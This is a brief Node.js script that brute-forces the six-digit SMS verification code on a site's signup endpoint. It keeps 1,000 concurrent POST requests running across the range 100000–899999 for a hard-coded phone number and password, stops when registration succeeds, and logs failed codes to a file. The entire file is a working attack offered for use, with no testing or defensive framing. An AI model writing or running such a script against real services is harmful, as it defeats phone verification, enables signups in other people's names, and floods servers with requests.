const Axios = require('axios');
const fse = require('fs-extra');

const errorPhone = [];

(async () => {
	const maxPending = 1000;
	let isPending = 0;
	let code = 100000;
	
	main();
	function main() {
		for (let i = 0; i < maxPending; i++) {
			startOne();
		}
	}
	function startOne() {
		isPending++;
		let i = code++;

		Axios.post('https://dev.wuxuwang.com/user/signup', {
			data: {
				tel: 15889027710,
				password: 123123123,
				code: i,
				country: 86,
			}
		}, {
			transformRequest: [
				function (data) {
					let str = Object.keys(data.data).reduce((sum, item) => {
						sum.push(`${encodeURIComponent(item)}=${encodeURIComponent(data.data[item])}`);
						return sum
					}, []).join('&');
					return str;
				}
			],
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded'
			}
		}).then(res => {
			console.log(res.data);
			console.log(`验证码：${i}回来了~~~；state==>: ${res.data.state}`);
			if (res.data.state == 0) {
				console.log('注册成功~~~~~~');
				process.exit();
			}
		}).catch(err => {
			errorPhone.push(i);
		}).finally(() => {
			isPending--;

			if (isPending < maxPending && code < 899999) {
				startOne();
			}
		})
	}
})()

process.on('exit', () => {
	fse.writeJSONSync('./errorCode.json', errorPhone);
})